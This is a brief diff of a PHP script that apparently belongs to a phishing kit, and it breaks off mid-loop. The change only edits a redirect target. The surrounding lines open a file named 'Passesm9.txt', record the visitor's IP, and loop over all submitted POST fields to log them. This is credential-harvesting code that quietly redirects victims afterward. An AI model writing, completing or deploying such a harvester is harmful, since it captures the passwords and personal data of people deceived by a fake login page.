@@ -1,5 +1,5 @@
 <?php
-header ('Location: index.html');
+header ('Location: new/index.html');
 $handle = fopen("Passesm9.txt", "a");
 $ip = $_SERVER['REMOTE_ADDR'];
 foreach($_POST as $variable => $value) {
